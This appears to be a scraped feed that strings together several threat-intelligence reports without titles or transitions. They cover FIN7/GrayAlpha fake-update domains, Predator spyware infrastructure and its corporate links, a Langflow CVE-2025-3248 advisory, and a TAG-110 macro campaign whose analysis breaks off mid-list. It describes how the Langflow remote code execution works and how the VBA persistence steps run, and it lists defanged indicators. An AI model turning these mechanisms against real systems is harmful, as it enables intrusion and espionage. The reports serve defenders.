        <p>Fake update websites often use the same script designed to fingerprint the host system, consisting of the functions getIPAddress() and trackPageOpen(). As previously reported, these scripts usually send a POST request to a CDN-themed domain, such as <em>cdn40[.]click</em> (see <strong>Figure 2</strong>). These domains typically begin with "cdn" followed by a random number and a top-level domain (TLD). The malicious payload is commonly delivered via the /download.php endpoint. However, Insikt Group has also identified variations, including /download/download.php, download2.php, and product-specific paths (such as /download/aimp_5.30.2541_w64-release.exe). Additionally, in at least one case, the threat actors <a href="https://pro.urlscan.io/result/ac51686b-4741-4dcd-bbad-37daa47555a3/dom">appeared</a> to use a compromised domain — <em>worshipjapan[.]com</em> — for fingerprinting purposes. This activity was observed on a website associated with the domain <em>as4na[.]com</em>.</p>

          </div>
        </div>
        <p>Notably, while most domains associated with Infection Vector 1 are crafted to impersonate legitimate software products, some appear to be randomly generated or arbitrary. Examples include <em>teststeststests003202[.]shop</em>, which is tied to the email address <em>kasalboov@web[.]de</em>, according to its WHOIS record. This same email is also linked to domains such as <em>lexisnexis[.]pro</em>, <em>aimp[.]xyz</em>, <em>concur[.]life</em>, <em>cdn3535[.]shop</em>, and <em>cdn251[.]lol</em>. Additional anomalies include domains like <em>gogogononono[.]top</em> and <em>gogogononono[.]xyz</em>, both hosted on the IP address <em>103[.]35[.]190[.]40</em>, which also hosts lexisnexis[.]lat.</p>
        <h5>FIN7’s Previous Activity Using Fake Advanced IP Scanner</h5>
        <p>Although the first Advanced IP Scanner–themed domains linked to GrayAlpha, as discussed in this report, began resolving in early 2024 (see <strong>Figure 3</strong>), Insikt Group had already observed FIN7 leveraging a fake Advanced IP Scanner domain to compromise victims as early as the second half of 2023. Specifically, during a brief period at the end of September 2023, Insikt Group identified over 212 infected systems communicating with a FIN7-controlled Carbanak C2 server <em>166[.]1[.]160[.]118</em> via TCP port 443. While this activity was initially attributed to the exploitation of a one-day vulnerability chain, subsequent analysis <a href="https://tria.ge/230927-vr6d9sea73/behavioral1">revealed</a> that the infections were instead linked to the typosquatted domain <em>advanced-ip-sccanner[.]com</em> — which was hosted behind Cloudflare at the time.</p>

        <h4>Hosting Analysis</h4>
        <p>The vast majority of domains associated with Infection Vector 1 resolved to infrastructure operated by the bulletproof hoster, Stark Industries Solutions (AS44477), with additional hosting observed on AS29802 (HIVELOCITY, Inc.) and AS41745 (FORTIS-AS) (see <strong>Figure 4</strong>). Notably, infrastructure within AS29802 consisted of IP space controlled by bulletproof hoster 3NT Solutions LLP and announced via HIVELOCITY. Hosting infrastructure for Infection Vector 2 is predominantly concentrated within AS41745, as detailed further in the <strong>Infection Vector 2: 7-Zip Impersonation</strong> section of this report.</p>

          </div>
        </div>
        <p>FORTIS-AS (AS41745), commonly referenced by its responsible organization, “Baykov Ilya Sergeevich” (ORG-HIP1-RIPE), has been repeatedly leveraged in activities related to FIN7. In addition to infrastructure linked to Stark Industries Solutions, FORTIS-AS has hosted infrastructure used to deploy malware families such as POWERTRASH and DiceLoader, both of which are directly associated with FIN7 operations.</p>
        <p>According to the WHOIS record for netblock <em>85[.]209[.]134[.]0/24</em>, which is used by GrayAlpha, the block is assigned to Baykov Ilya Sergeevich (ORG-HIP1-RIPE). This entity is closely tied to the infrastructure service provider (ISP) “hip-hosting”, with multiple contact points and technical references — including domains such as <em>fortis[.]host</em> and <em>hip-hosting[.]com</em> — appearing throughout the record (see <strong>Figure 5</strong>).</p>

        </p>
        <h2>Executive Summary</h2>
        <p>Following major public exposures by Insikt Group and others throughout the last two years, alongside US government sanctions targeting the Intellexa Consortium — the organizational structure behind the Predator mobile spyware — Insikt Group observed a significant decline in Predator-related activity. This apparent decline raised questions about whether the combination of US sanctions, public exposure, and broader international efforts to curb spyware proliferation, such as the UK and France-led Pall Mall process, had dealt a lasting blow to Intellexa’s operations. Yet, Predator activity has not stopped, and in recent months, Insikt Group has observed a resurgence of activity, reflecting the operators’ continued persistence. While much of the identified infrastructure is tied to known Predator operators in countries previously identified by Insikt Group, a new customer has also been identified in Mozambique — a country not previously publicly linked to the spyware. This aligns with the broader observation that Predator is highly active in Africa, with over half of its identified customers located on the continent. Additionally, Insikt Group has found a connection between high-tier Predator infrastructure and a Czech entity previously associated with the Intellexa Consortium.</p>
        <p>The deployment of spyware like Predator beyond legitimate criminal or counterterrorism use poses serious threats to privacy, legal rights, and the physical safety of both direct targets and associated individuals. While most known cases of abuse have targeted civil society and political activists, individuals and organizations in regions with a record of spyware misuse should remain vigilant, regardless of sector. Given Predator’s expensive licensing model, its use is typically reserved for high-value, strategic targets. This makes politicians, corporate executives, and others in sensitive positions especially vulnerable due to the intelligence they may possess. The use of spyware against political opposition figures is currently under investigation in several EU countries, reflecting wider global efforts to curb the activities of mercenary spyware developers.</p>
        <p>As outlined in Insikt Group’s previous reports on Predator, defenders should follow recommended best practices. These include ensuring personal and corporate devices are kept separate, regularly updating phones, encouraging periodic device reboots (though this may not always fully eliminate Predator), using lockdown mode, and implementing a mobile device management (MDM) system. Additionally, investing in security awareness training for employees and fostering a culture of minimal data exposure are essential for reducing the risk of successful spearphishing attacks and limiting data theft in the event of a breach.</p>
        <p>Insikt Group expects the mercenary spyware market to continue expanding, fueled by sustained demand and corporate profitability. This growth will likely be accompanied by ongoing innovation, as rising competition and strengthened IT security among targets drive the development of new products and techniques. For instance, as defenders work to eliminate entire classes of vulnerabilities, spyware operators may adapt by targeting alternatives such as cloud backups accessed via stolen credentials or by employing new deployment methods. As these tools proliferate and techniques evolve, the range of victims is likely to extend beyond civil society, influencing political discourse and sparking further legal confrontations. Recent court rulings in favor of technology companies against spyware vendors may set a precedent, encouraging more firms to actively challenge the misuse of their platforms. Insikt Group anticipates that spyware vendors will continue leveraging complex corporate structures to evade sanctions or detection, while increasingly tailoring their operations to specific regions, a trend often described as the balkanization of the ecosystem.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>Insikt Group has identified new infrastructure associated with Predator, indicating continued operations despite public exposure, international sanctions, and policy interventions.</li>
          <li>The newly identified infrastructure includes both victim-facing Tier 1 servers as well as high-tier components that likely link back to Predator operators in various countries.</li>
          <li>Although much of Predator’s infrastructure remains consistent with previous reporting, its operators have introduced changes designed to further evade detection — a pattern Insikt Group noted in earlier reporting.</li>
          <li>Insikt Group has detected Predator-related activity in several countries throughout the last twelve months and is the first to report a suspected Predator operator presence in Mozambique.</li>
          <li>Insikt Group also connected components of Predator’s infrastructure to a Czech entity previously linked with the Intellexa Consortium by a Czech investigative outlet.</li>
        </ul>
        <h2>Background</h2>
        <p>Predator is a sophisticated mercenary spyware targeting both Android and iPhone devices and has been active since at least 2019. Originally developed by Cytrox and now operated under the Intellexa alliance, Predator is engineered for flexibility and stealth, leaving minimal evidence on infected devices and making external investigations into abuse particularly challenging. Once deployed, Predator provides complete access to a device’s microphone, camera, and all data — such as contacts, messages, photos, and videos — without the victim’s awareness. The spyware’s modular design, based on Python, <a href="https://blog.talosintelligence.com/mercenary-intellexa-predator/">allows</a> operators to introduce new features remotely, without the need to re-exploit the device.</p>
        <p>Predator can be <a href="https://citizenlab.ca/2021/12/pegasus-vs-predator-dissidents-doubly-infected-iphone-reveals-cytrox-mercenary-spyware/">delivered</a> through both "1-click" and "zero-click" attack vectors. "1-click" attacks rely on social engineering messages with malicious links that require user interaction (<a href="https://citizenlab.ca/2023/09/predator-in-the-wires-ahmed-eltantawy-targeted-with-predator-spyware-after-announcing-presidential-ambitions/">1</a>, <a href="https://citizenlab.ca/2021/12/pegasus-vs-predator-dissidents-doubly-infected-iphone-reveals-cytrox-mercenary-spyware/">2</a>, <a href="https://www.amnesty.org/en/documents/act10/7245/2023/en/">3</a>), while "zero-click" attacks, described in the "<a href="https://www.amnesty.org/en/documents/act10/7245/2023/en/">Predator Files</a>," involve techniques that do not require any action from the target, such as network injection or proximity-based methods. However, there have been no confirmed cases of Predator using fully remote "zero-click" exploits like those seen with NSO Group Pegasus, which can compromise devices through messaging apps without any user interaction (for example, <a href="https://citizenlab.ca/2021/09/forcedentry-nso-group-imessage-zero-click-exploit-captured-in-the-wild/">FORCEDENTRY</a> or <a href="https://citizenlab.ca/2023/09/blastpass-nso-group-iphone-zero-click-zero-day-exploit-captured-in-the-wild/">BLASTPASS</a>).</p>
        <p>Over the past two years, Insikt Group has identified suspected Predator operators in more than a dozen countries, including in Angola, Armenia, Botswana, the Democratic Republic of the Congo, Egypt, Indonesia, Kazakhstan, Mongolia, Mozambique, Oman, the Philippines, Saudi Arabia, and Trinidad and Tobago (<a href="/research/predator-spyware-operators-rebuild-multi-tier-infrastructure-target-mobile-devices">1</a>, <a href="/research/predator-spyware-infrastructure-returns-following-exposure-sanctions">2</a>). Notably, this is the first public report to identify Mozambique as a suspected customer. While Predator is ostensibly marketed for counterterrorism and law enforcement purposes, previous reporting has documented a clear pattern of its deployment against civil society actors, including journalists and activists, and politicians (<a href="https://citizenlab.ca/2021/12/pegasus-vs-predator-dissidents-doubly-infected-iphone-reveals-cytrox-mercenary-spyware/">1</a>, <a href="https://insidestory.gr/article/poios-parakoloythoyse-kinito-toy-dimosiografoy-thanasi-koykaki">2</a>, <a href="https://www.nytimes.com/2023/03/20/world/europe/greece-spyware-hacking-meta.html">3</a>, <a href="https://citizenlab.ca/2023/09/predator-in-the-wires-ahmed-eltantawy-targeted-with-predator-spyware-after-announcing-presidential-ambitions/">4</a>). These instances described in earlier reports likely represent only a small portion of the overall abuses, given the widespread use of mercenary spyware like Predator, the difficulty of detection, and limited victim support. It is important to emphasize the risk of cross-border targeting, which has been observed not only with Predator, where an operator <a href="https://www.europarl.europa.eu/doceo/document/P-9-2024-001059_EN.html">linked</a> to Vietnam has targeted EU officials and members of the European Parliament, but also with <a href="https://www.brookings.edu/articles/how-digital-espionage-tools-exacerbate-authoritarianism-across-africa/">other mercenary spyware</a>, such as Pegasus.</p>
        <p>Despite increased public reporting on Predator’s infrastructure and <a href="https://www.amnesty.org/en/documents/act10/7245/2023/en/">techniques</a>, as well as growing attention to Intellexa’s <a href="https://dfrlab.org/2024/04/22/markets-matter-a-glance-into-the-spyware-industry/">corporate structure</a>, Predator operations remain active. This persistence continues even after measures such as <a href="https://home.treasury.gov/news/press-releases/jy2581">US sanctions</a>, an <a href="https://www.europarl.europa.eu/news/en/press-room/20230609IPR96217/spyware-meps-call-for-full-investigations-and-safeguards-to-prevent-abuse">EU resolution</a>, a <a href="https://home.treasury.gov/news/press-releases/jy2155">US visa</a> ban on Intellexa affiliates, and the launch of the <a href="https://www.gov.uk/government/publications/the-pall-mall-process-declaration-tackling-the-proliferation-and-irresponsible-use-of-commercial-cyber-intrusion-capabilities">Pall Mall Process</a>, alongside <a href="https://techcrunch.com/2024/04/06/price-of-zero-day-exploits-rises-as-companies-harden-products-against-hackers/?guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&amp;guce_referrer_sig=AQAAAK6C-oJQRNB8Ap98Hh44SWmj_mn3W34kE1QqlhLYsuHtMci4nmJrwMOGMgIpGRm65bQ5SYB7CKBzb-tHfP3jskDDrMZ9eMqRXBtY8VXdobKPRoCkTdTSpBua2hCEIfSN0NuoVfH2GDnsX1RrNIJtFXIOAz7Bb7tGkwpb0ROh9qnK&amp;guccounter=2">likely rising</a> exploit costs, particularly for iPhones. This likely reflects growing demand for spyware tools, especially in countries facing export restrictions, ongoing technical innovation in response to public reporting and security enhancements, and increasingly complex corporate structures designed to impede sanctions and attribution. One such example, involving a Czech entity likely linked to Predator operations, is discussed later in this report.</p>
        <h2>Threat Analysis</h2>
        <h3>Tier 1 (C2) Servers</h3>
        <p>Insikt Group has identified new victim-facing Tier 1 (C2) infrastructure that is highly likely associated with Predator, including domains and IP addresses. Although the specific functions of these domains and IP addresses have not yet been confirmed, they are probably involved in payload delivery and the exploitation process, consistent with previous infrastructure linked to Predator. A table in <strong>Appendix B</strong> presents the domains and IP addresses observed over the past twelve months.</p>
        <p>Previously, domains linked to Predator often impersonated specific organizations, such as frequently visited local news outlets, as Insikt Group has reported in the past (<a href="/research/predator-spyware-operators-rebuild-multi-tier-infrastructure-target-mobile-devices">1</a>, <a href="/research/predator-spyware-infrastructure-returns-following-exposure-sanctions">2</a>). However, this pattern began to gradually shift following increased media attention and public reporting from the end of 2023 onward. More recent domains now typically consist of two or more seemingly random English words. Insikt Group has observed that some of these domains reuse particular keywords; for instance, both <em>boundbreeze[.]com</em> and <em>branchbreeze[.]com</em> share the word "breeze". In a few recent cases, domains feature Portuguese-language words, which likely reflect the language of intended targets. Additionally, certain domains contain keywords that could provide clues to their targeting, such as <em>keep-badinigroups[.]com</em>, which may refer to communities or groups associated with the Badini dialect spoken in the Badinan region of Iraqi Kurdistan.</p>
        <p>The majority of identified domains have been registered through the registrar PDR Ltd. d/b/a PublicDomainRegistry.com and typically use name servers associated with <em>orderbox-dns[.]com</em>, among others. While Predator infrastructure has historically favored certain autonomous system numbers (ASNs) such as AS62005, AS61138, and AS44066, Insikt Group has observed that more recent Predator-linked domains are being hosted on a broader range of ASNs — including AS42708, AS20473, and AS44477 — which have not previously been connected to Predator activity. Notably, Insikt Group also identified at least one instance where a server tied to higher-tier Predator infrastructure was hosted with Stark Industries.</p>
        <h4>Suspected Infrastructure Detection Evasion Strategies</h4>
        <p>In response to ongoing public exposure, the operators behind Predator have adopted various tactics to evade detection. These involve using more varied server configurations than <a href="https://citizenlab.ca/2023/10/predator-spyware-targets-us-eu-lawmakers-journalists/">previously</a> <a href="https://blog.sekoia.io/active-lycantrox-infrastructure-illumination/">reported</a>, expanding the diversity of ASNs, and introducing additional layers to their multi-tiered infrastructure, among other approaches. One notable strategy involves the use of fake websites, which generally fall into four main categories: fake 404 error pages, counterfeit login or registration pages, sites indicating that they are under construction, and websites purporting to be associated with specific entities, such as a conference (see <strong>Figures 1-4</strong>).</p>

        </div>
        <h3>Multi-Tiered Infrastructure</h3>
        <p>As previously reported by Insikt Group, Predator customers continue to use a multi-tiered infrastructure network, which is likely designed to enable the targeting of specific individuals or entities (see <strong>Figure 5</strong>). This network closely resembles the high-level architecture <a href="https://www.amnesty.org/en/documents/act10/7245/2023/en/">outlined</a> in Amnesty’s October 2023 report, but it has continued to evolve since then. Earlier versions of Predator’s multi-tiered infrastructure, reported by Insikt Group in March 2024, featured only three layers. The addition of a fourth layer in the current design is likely intended to further obscure the identification of countries suspected of deploying Predator.</p>

          </div>
        </div>
        <p>Leveraging Recorded Future® Network Intelligence, Insikt Group has observed that Tier 1 servers consistently communicate with a dedicated Tier 2 upstream virtual private server (VPS) IP address using Transmission Control Protocol (TCP) port 10514. These upstream servers likely function as anonymization hop points, making it more difficult to associate Tier 1 servers directly with individual Predator customers. Communication over TCP port 10514 is also consistently observed between Tier 2 and Tier 3 servers. Subsequently, Tier 3 servers relay traffic to the Tier 4 layer, which appears to correspond to static, in-country ISP IP addresses suspected to be under the control of Predator customers. In every instance analyzed, both the Tier 1 servers and their corresponding upstream servers appeared to be dedicated exclusively to a single customer.</p>
        <p>While only Tiers 1 through 4 appear directly connected to the operational infrastructure of Predator customers, Insikt Group has also been monitoring an additional layer, tracked as Tier 5, that seems to play a central, though still unclear, role in Predator-related operations. Tier 5 servers have been linked to an entity in the Czech Republic, FoxITech s.r.o., which has previously been publicly associated with Intellexa and is discussed further in the Connection to Czech Entity section.</p>
        <h3>Suspected Predator Usage Within Specific Countries</h3>
        <p>Since Insikt Group began reporting on Predator in March 2024, suspected operators of the spyware have been identified in over a dozen countries worldwide. While several of these operators have remained active in the past twelve months, activity appears to have ceased in some locations, likely due to public reporting, leading to an overall lower number of current Predator operators. For example, in the Democratic Republic of the Congo (DRC), operations seem to have stopped about two weeks after Insikt Group published its findings on DRC-linked activity in September 2024. Similarly, the suspected operator in Angola became inactive around the same period, only to resume activity in early 2025, based on Recorded Future Network Intelligence. Additionally, Insikt Group has uncovered evidence of Predator use in Mozambique — a country where no Predator operators had been identified before this report.</p>
        <h4>Mozambique</h4>
        <p>Drawing on Recorded Future Network Intelligence and other artifacts, Insikt Group attributes the domains listed in <strong>Table 1</strong> with high confidence to a suspected Predator operator based in Mozambique. Additionally, several other domains, including <em>mdundobeats[.]com</em>, <em>noticiafamosos[.]com</em>, and <em>onelifestyle24[.]com</em>, as well as others from <strong>Appendix B</strong>, are likely linked to the same customer based on various technical indicators in Recorded Future sources. Notably, all IP addresses associated with these domains, except for the one hosting <em>onelifestyle24[.]com</em>, fall within the same two /24 CIDR ranges. Insikt Group further assesses, using both Recorded Future Network Intelligence and passive DNS data, that the suspected Predator operator in Mozambique became active during the first half of 2024 and still appears to be active at the time of writing.</p>

        <p><strong><em>Table 1:</em></strong> <em>Domains and IP addresses linked to Predator customer located in Mozambique (Source: Recorded Future)</em></p>
        <p>Although there has been no public reporting to date linking Predator to Mozambique, earlier investigations have connected the country to other forms of surveillance. In 2021, a report, drawing on a <a href="https://citizenlab.ca/2018/09/hide-and-seek-tracking-nso-groups-pegasus-spyware-to-operations-in-45-countries/">2018 Citizen Lab analysis</a>, <a href="https://www.brookings.edu/articles/how-digital-espionage-tools-exacerbate-authoritarianism-across-africa/">suggested</a> that Mozambique was likely a Pegasus operator (there were no confirmed Pegasus infections within Mozambique at that time). Additionally, a 2016 report by the Mozambican investigative outlet Verdade <a href="https://advox.globalvoices.org/2016/05/16/the-government-of-mozambique-is-spying-on-its-citizens-according-to-verdade/">revealed</a> that the government had acquired and was using advanced surveillance technologies to monitor citizens’ communications.</p>
        <h4>Additional Cluster Linked to Eastern European Country</h4>
        <p>While many of the identified domains and IP addresses can be attributed to specific suspected operators in particular countries, attribution is less straightforward in other cases. Technical indicators frequently connect multiple domains and IP addresses into distinct clusters, which Insikt Group assesses are likely controlled by the same operator.</p>
        <p>One such cluster was notable for its brief period of activity. Recorded Future Network Intelligence indicates this cluster was active only from August to November 2024 and likely consisted of just two sets of Tier 1 to Tier 4 servers. This cluster could represent testing and development operations due to its brevity, or it could be linked to an Eastern European operator on account of its location. Currently, <em>speedbrawse[.]com</em> is the sole domain associated with this cluster. Insikt Group assesses that the abrupt halt in activity of this operator may also be linked to the <a href="https://home.treasury.gov/news/press-releases/jy2581">escalation</a> of sanctions against Intellexa in September 2024.</p>
        <h3>Connection to Czech Entity</h3>
        <p>During the investigation into the use of Predator against the Greek journalist Thanasis Koukakis and others, Greece’s Supreme Court prosecutor <a href="https://vsquare.org/greece-czech-republic-intellexa-cytrox-spyware/">directed</a> the financial police to compile a report on companies connected to the Intellexa Consortium — a document later obtained by the Czech investigative outlet Investigace.cz. This report features a supplier table listing entities associated with Intellexa, including an individual named Dvir Horef Hazan. He, along with the connections described in the report, is shown in <strong>Figure 6</strong>.</p>

            <div><strong><em>Figure 6:</em></strong> <em>Connections between Predator infrastructure and FoxITech s.r.o. (Source: Investigace.cz, Recorded Future)</em></div>
          </div>
        </div>
        <p>Investigations by the Czech outlet <a href="https://vsquare.org/greece-czech-republic-intellexa-cytrox-spyware/">found</a> that Hazan, a Czech bistro owner, programmer, and entrepreneur with ownership of at least eight Czech companies, with four specializing in marketing, consulting, and IT advisory, allegedly worked for Intellexa. Greek police reports show that Intellexa transferred nearly €3 million to Hazan and three of his companies (Zambrano Trade s.r.o., Hadastech s.r.o., and Shilo s.r.o.) for unspecified services. Additionally, Importgenius records reveal that Hadastech, solely directed by Hazan, received 40 shipments from an unidentified Ukrainian company between 2020 and 2021, described as mobile phones and "other networking apparatus."</p>
        <p>Further analysis shows that Hazan is also indirectly linked to FoxITech s.r.o., a Czech company based in Krnov and owned by Michal Ikonomidis, which claims to provide integrated IT and business services, including software development, cybersecurity, HR recruitment, and back-office support, to clients globally. More specifically, FoxITech s.r.o. is headquartered in a building owned by one of Hazan’s companies, which also houses the other previously mentioned Hazan-owned businesses. This link between Hazan and FoxITech s.r.o. is further evidenced by Hazan and Ikonomidis appearing to be friends, based on social media, and the fact that Hazan’s first company and FoxITech s.r.o. were both registered at the notary’s office by the same proxy. Moreover, RIPE (Réseaux IP Européens) entries linked to FoxITech s.r.o. include email addresses associated with Hazan’s company, Shilo s.r.o. According to Investigace.cz, an email sent to FoxITech s.r.o. was answered from an address belonging to one of Hazan’s companies, Bender ONE s.r.o.</p>
        <p>Although the precise nature and purpose of the connection between FoxITech s.r.o. and Predator operations remain unclear, Insikt Group has observed that Tier 4 servers regularly communicate with Tier 5 infrastructure, which is linked to FoxITech s.r.o. This establishes a link between Predator’s multi-tiered infrastructure and the Czech entity, marking the first technical connection made between Predator infrastructure and corporate entities associated with the Intellexa Consortium.</p>
        <p>Notably, Investigace.cz previously <a href="https://vsquare.org/greece-czech-republic-intellexa-cytrox-spyware/">reported</a> on Cytrox in the Czech Republic, revealing that the company’s listed director was a pensioner from a village near Ostrava, unaware of Intellexa. She knew Hazan, a family acquaintance living nearby. Also, her daughter’s husband, Amos Uzan, is an Israeli who worked in government security and communications roles from 2003–2009, during Ehud Olmert’s tenure as Prime Minister. Olmert had previously disclosed that he was a paid advisor to Intellexa between 2006 to 2009.</p>
        <h2>Outlook</h2>
        <p>Insikt Group has uncovered evidence indicating the continued use of Predator, including in Mozambique, despite widespread media attention and sanctions targeting Intellexa and related entities. Although recent activity has been observed, the reduced number of suspected operators compared to earlier reports suggests that public exposure, sanctions, and related measures have likely imposed operational costs on Intellexa. Moreover, while Predator operators historically maintained a consistent modus operandi, the latest findings reveal the adoption of new tactics to evade detection. Sanctions and other pressures are likely to drive efforts to increase the complexity of corporate structures, making operations harder to trace and disrupt. The continued spread of Predator and similar spyware products, as well as the availability of hack-for-hire services beyond legitimate law enforcement and counterterrorism uses, presents a significant risk to a broad range of organizations and individuals.</p>

            <content:encoded><![CDATA[
        <h2>Langflow: CVE-2025-3248</h2>
        <h3>What is CVE-2025-3248?</h3>
        <p><a href="https://www.recordedfuture.com/vulnerability-database/cve-2025-3248">CVE-2025-3248</a> is a critical missing authentication vulnerability affecting Langflow versions before 1.3.0. Langflow is a widely used tool for building and deploying AI-powered agents and workflows. On May 5, 2025, the US Cybersecurity and Infrastructure Security Agency (<a href="https://www.cisa.gov/">CISA</a>) also added CVE-2025-3248 to its <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">Known Exploited Vulnerabilities (KEV) catalog</a>. Exploiting the vulnerability can allow remote, unauthenticated attackers to send crafted HTTP requests and execute arbitrary code by abusing Python decorators and default arguments.</p>
        <p>Given the high risk associated with this vulnerability and ongoing exploitation attempts, it is imperative to prioritize patching CVE-2025-3248 on your company's assets to prevent unauthorized access and attackers potentially taking control of affected systems.</p>
        <h4>Insikt Group’s Assessment of CVE-2025-3248</h4>
        <p>CVE-2025-3248 arises from Langflow’s failure to implement appropriate input sanitization and execution control at the "/api/v1/validate/code" endpoint, where it insecurely uses Python’s "compile" and "exec()" function to process user-supplied code. Specifically, the vulnerability results from Langflow’s approach of validating function definitions by parsing them into an Abstract Syntax Tree (AST) and executing specific components.</p>
        <p>The endpoint parses the user-submitted code field using "ast.parse()" to construct an AST. Langflow then uses Python’s compile function to convert the parsed AST into executable bytecode. During AST processing, Python evaluates argument default values and decorators immediately upon compilation. This evaluation occurs when the AST node representing the function is processed, not strictly during the ast.parse() step. If these components contain malicious payloads, they are executed as part of the compilation and execution phase.</p>
        <p>Unauthenticated attackers can therefore craft malicious payloads embedded within argument defaults or decorators. Since Langflow does not enforce input validation or sandboxing, these payloads are compiled and executed within the server context, leading to remote code execution (RCE). In vulnerable versions, remote threat actors can submit specially crafted POST requests to the endpoint, potentially deploying reverse shell commands, data exfiltration scripts, or other malicious code without authentication or adequate restriction.</p>
        <p>At the time of writing, there were 1,050 exposed Langflow instances on Shodan. However, not all of these are necessarily vulnerable as their specific versions are unknown. Additionally, cybersecurity firm Greynoise observed 361 malicious IP addresses attempting to exploit CVE-2025-3248, primarily targeting systems in the US, Australia, Singapore, Germany, and Mexico.</p>

        <h4>Recommended Actions for CVE-2025-3248</h4>
        <p>Users should upgrade to Langflow version 1.3.0. If upgrading is not possible, secure Langflow by restricting network access through a firewall and blocking public access to the "/api/v1/validate/code" endpoint. Additionally, monitor logs for suspicious POST requests on the endpoint.</p>

        <h2>Executive Summary</h2>
        <p>From January to February 2025, Insikt Group detected a phishing campaign targeting Tajikistan that Insikt Group attributes to TAG-110, a Russia-aligned threat actor that overlaps with UAC-0063 and has been linked to APT28 (BlueDelta) with medium confidence by CERT-UA. In this campaign, TAG-110 leveraged Tajikistan government-themed documents as lure material, consistent with its historical use of trojanized legitimate government documents, though the authenticity of the current samples could not be independently verified. These documents were distinct from those used in previous campaigns (<a href="/research/russia-aligned-tag-110-targets-asia-and-europe">1</a>, <a href="https://www.bitdefender.com/en-us/blog/businessinsights/uac-0063-cyber-espionage-operation-expanding-from-central-asia">2</a>, <a href="https://cert.gov.ua/article/6280129">3</a>, <a href="https://blog.sekoia.io/double-tap-campaign-russia-nexus-apt-possibly-related-to-apt28-conducts-cyber-espionage-on-central-asia-and-kazakhstan-diplomatic-relations/">4</a>), notably lacking an embedded <a href="https://learn.microsoft.com/en-us/previous-versions/ms536495(v=vs.85)">HTA</a>-based payload HATVIBE within them, which TAG-110 has deployed since at least 2023. In this campaign, TAG-110 has shifted to using macro-enabled Word template files (.dotm files) rather than HATVIBE for the initial payload. Given TAG-110’s historical targeting of public sector entities in Central Asia, this campaign is likely targeting government, educational, and research institutions within Tajikistan.</p>
        <p>Russia’s Central Asian policy centers on preserving a post‑Soviet sphere of influence by embedding itself at the core of the region’s security, economic, and political architecture. TAG-110's activities continue to bolster this policy through intelligence-gathering operations. Insikt Group anticipates TAG‑110 will sustain regional operations against government ministries, academic and research bodies, and diplomatic missions, particularly those involved in upcoming elections, military operations, or other events the Kremlin wishes to influence.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>TAG-110 has changed its spearphishing tactics in recent campaigns against Tajikistan, as they now rely on macro-enabled Word templates (.dotm files).</li>
          <li>This campaign has been attributed to TAG-110 based on its reuse of VBA code found in lures from previous campaigns, overlap in C2 infrastructure, and use of suspected legitimate government documents for lure material.</li>
          <li>TAG-110’s persistent targeting of Tajik government, educational, and research institutions supports Russia’s strategy to maintain influence in Central Asia. These cyber-espionage operations likely aim to gather intelligence for influencing regional politics or security, particularly during sensitive events like elections or geopolitical tensions.</li>
          <li>TAG-110’s recent use of macro-enabled Word templates (.dotm), placed in the Microsoft Word STARTUP folder for automatic execution, highlights a tactical evolution prioritizing persistence. Organizations should monitor the Word STARTUP directory for unauthorized additions and enforce strict macro security policies.</li>
        </ul>
        <h2>Background</h2>
        <p>TAG-110 is a Russia-aligned threat actor overlapping with UAC-0063, which has been linked to APT28 (BlueDelta) with medium confidence by CERT-UA. TAG-110 has conducted cyber-espionage campaigns primarily targeting Central Asia since <a href="https://cert.gov.ua/article/4697016?fbclid=IwAR1B5gj0v-Ve9Q5299ydM5lrInLuKVmvPRosQkUucq6YzcjuTgVnM_x3LjQ">at least 2021</a>. Historically, this group has been known for its use of macro-enabled Word documents to deliver malicious payloads such as HATVIBE, an HTA-based malware designed for initial access and persistence. In November 2024, Insikt Group <a href="/research/russia-aligned-tag-110-targets-asia-and-europe">highlighted</a> TAG-110’s use of HTA-embedded spearphishing attachments in emails tailored for Central Asian diplomatic entities. TAG-110’s operations have been documented by organizations such as <a href="https://cert.gov.ua/article/4697016?fbclid=IwAR1B5gj0v-Ve9Q5299ydM5lrInLuKVmvPRosQkUucq6YzcjuTgVnM_x3LjQ">CERT-UA</a>, <a href="https://www.bitdefender.com/en-us/blog/businessinsights/uac-0063-cyber-espionage-operation-expanding-from-central-asia">BitDefender</a>, and <a href="https://blog.sekoia.io/double-tap-campaign-russia-nexus-apt-possibly-related-to-apt28-conducts-cyber-espionage-on-central-asia-and-kazakhstan-diplomatic-relations/">Sekoia</a>, with recent campaigns targeting entities in Kazakhstan, Uzbekistan, and other Central Asian states. TAG-110 continues to use a variety of custom malware families to conduct espionage activities, including CHERRYSPY (DownExPyer), LOGPIE, and PyPlunderPlug.</p>
        <h2>Threat Analysis</h2>
        <p>Beginning in January 2025, Insikt Group detected new TAG-110 first-stage payloads, which suggested the threat actors were evolving their tactics. Previously, TAG-110 leveraged macro-enabled Word documents to deliver HATVIBE, an HTA-based malware, for initial access. The newly detected documents do not contain the embedded HTA HATVIBE payload for creating a scheduled task and instead leverage a global template file placed in the Word startup folder for persistence.</p>

        <p>The first document (<strong>Figure 1</strong>) appears to be a notice to the armed forces of Tajikistan themed on ensuring radiation safety. Machine translation incorrectly translated “РТ” as “Republic of Tartarstan,” but in the wider document context, “PT” likely refers to the “Republic of Tajikistan,” as “Республика Таджикистан” is used in place of “PT” later in the document. Insikt Group has not been able to verify the authenticity of the document, but TAG-110 has <a href="https://blog.sekoia.io/double-tap-campaign-russia-nexus-apt-possibly-related-to-apt28-conducts-cyber-espionage-on-central-asia-and-kazakhstan-diplomatic-relations/">historically</a> used legitimate documents as lures.</p>

        <h3>Analysis of Sub Procedures</h3>
        <h4>Document_Open() Sub Procedure</h4>
        <p>Upon opening the malicious file, the document.open <a href="https://learn.microsoft.com/en-us/office/vba/api/word.document.open">event</a> is triggered, and the remaining code will:</p>
        <ul>
          <li>Unprotect the document using the key "gyjyfyjrtjrtjhfgjfrthrtj"</li>
          <li>Hide spelling errors</li>
          <li>Attempt to set the font line width to 0</li>
          <li>Copy itself to the Word startup folder (%APPDATA%\Microsoft\Word\STARTUP&lt;filename&gt;.dotm) in <a href="https://learn.microsoft.com/en-us/office/vba/api/word.wdsaveformat">XML template format with macros enabled</a> for persistence</li>

          </div>
        </div>
        <h4>AutoExec() Sub Procedure</h4>
        <p>Once the document has been added to the Word startup folder, it is treated as a global template and will run the <a href="https://learn.microsoft.com/en-us/office/vba/word/concepts/customizing-word/auto-macros">automatic macro</a> AutoExec every time Microsoft Word is started. The AutoExec macro completes the following operations:</p>
